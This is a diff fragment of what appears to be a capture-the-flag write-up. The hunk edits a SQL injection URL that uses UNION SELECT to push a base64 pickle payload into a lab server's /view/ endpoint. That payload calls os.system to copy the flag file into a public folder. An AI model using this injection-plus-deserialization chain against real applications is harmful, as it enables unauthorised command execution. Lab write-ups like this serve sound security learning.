@@ -96,7 +96,7 @@ print(base64.b64encode(pickle.dumps(PickleRce())))
 Output> gASVSQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjC5jcCBmbGFnLnR4dCBhcHBsaWNhdGlvbi9zdGF0aWMvaW1hZ2VzL2ZsYWcudHh0lIWUUpQu
 ```
 - SQL Injection: 
-    - `http://83.136.248.107:36336/view/2'%20UNION%20SELECT%20'gASVSQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjC5jcCBmbGFnLnR4dCBhcHBsaWNhdGlvbi9zdGF0aWMvaW1hZ2VzL2ZsYWcudHh0lIWUUpQu'--`
+    - `http://83.136.248.107:36336/view/'%20UNION%20SELECT%20'gASVSQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjC5jcCBmbGFnLnR4dCBhcHBsaWNhdGlvbi9zdGF0aWMvaW1hZ2VzL2ZsYWcudHh0lIWUUpQu'--`
 
 - Then visiting the file:
 
